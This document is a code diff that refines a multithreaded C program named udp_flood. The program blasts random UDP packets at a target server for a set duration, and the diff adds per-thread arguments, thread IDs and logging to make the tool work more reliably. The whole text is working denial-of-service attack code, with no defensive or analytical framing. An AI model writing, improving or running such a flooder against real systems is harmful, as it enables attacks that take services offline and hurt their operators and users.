@@ -7,29 +7,29 @@
 #include <time.h>
 #include <errno.h>
 
-#define PACKET_SIZE 1024
+#define PACKET_SIZE 512 // Reduced size for better network compatibility
 
 typedef struct {
     struct sockaddr_in server;
     time_t end_time;
+    int thread_id;
 } ThreadArgs;
 
 void* udp_flood(void* arg) {
-    ThreadArgs args = *(ThreadArgs*)arg;  // Copy struct to avoid shared memory issues
+    ThreadArgs args = *(ThreadArgs*)arg;  // Copy struct for thread safety
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-    
     if (sock < 0) {
         perror("Socket creation failed");
         pthread_exit(NULL);
     }
 
     char payload[PACKET_SIZE];
-    
-    // Unique random seed per thread
-    srand(time(NULL) ^ pthread_self());
+    srand(time(NULL) ^ args.thread_id);  // Unique random seed
+
+    printf("Thread %d started\n", args.thread_id);
 
     while (time(NULL) < args.end_time) {
-        // Generate a random payload
+        // Fill payload with random data
         for (int i = 0; i < PACKET_SIZE; i++) {
             payload[i] = rand() % 256;
         }
@@ -38,12 +38,13 @@ void* udp_flood(void* arg) {
                                     (struct sockaddr*)&args.server, sizeof(args.server));
 
         if (sent_bytes < 0) {
-            fprintf(stderr, "sendto failed: %s\n", strerror(errno));
+            fprintf(stderr, "Thread %d: sendto failed: %s\n", args.thread_id, strerror(errno));
             break;
         }
     }
 
     close(sock);
+    printf("Thread %d finished\n", args.thread_id);
     pthread_exit(NULL);
 }
 
@@ -71,12 +72,13 @@ int main(int argc, char* argv[]) {
            argv[1], atoi(argv[2]), duration, threads);
 
     pthread_t thread_pool[threads];
-    ThreadArgs args;
-    args.server = server;
-    args.end_time = end_time;
+    ThreadArgs args[threads];
 
     for (int i = 0; i < threads; i++) {
-        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args) != 0) {
+        args[i].server = server;
+        args[i].end_time = end_time;
+        args[i].thread_id = i;
+        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args[i]) != 0) {
             perror("Failed to create thread");
             return 1;
         }
